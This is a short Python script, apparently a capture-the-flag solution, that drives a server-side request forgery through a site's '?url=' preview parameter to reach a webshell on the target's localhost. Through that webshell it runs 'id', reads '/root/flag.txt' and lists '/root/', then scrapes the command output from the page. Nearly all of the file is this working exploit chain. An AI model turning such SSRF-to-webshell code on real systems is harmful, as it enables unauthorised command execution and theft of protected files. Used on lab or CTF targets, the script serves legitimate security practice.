import urllib.request
import urllib.parse
import re
import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url, timeout=10):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req, timeout=timeout)
        html = res.read().decode('utf-8', errors='replace')
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'PREVIEW: ' + m.group(1).strip()[:2000]
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'OTHER: len=' + str(len(html))
    except Exception as e:
        return f'EXCEPTION: {e}'

# Access webshell to read flag
print("=== id ===")
print(fetch("http://127.0.0.1/shell.php?c=id", timeout=10))
print()

print("=== cat /root/flag.txt ===")
print(fetch("http://127.0.0.1/shell.php?c=cat+/root/flag.txt", timeout=10))
print()

print("=== ls -la /root/ ===")
print(fetch("http://127.0.0.1/shell.php?c=ls+-la+/root/", timeout=10))
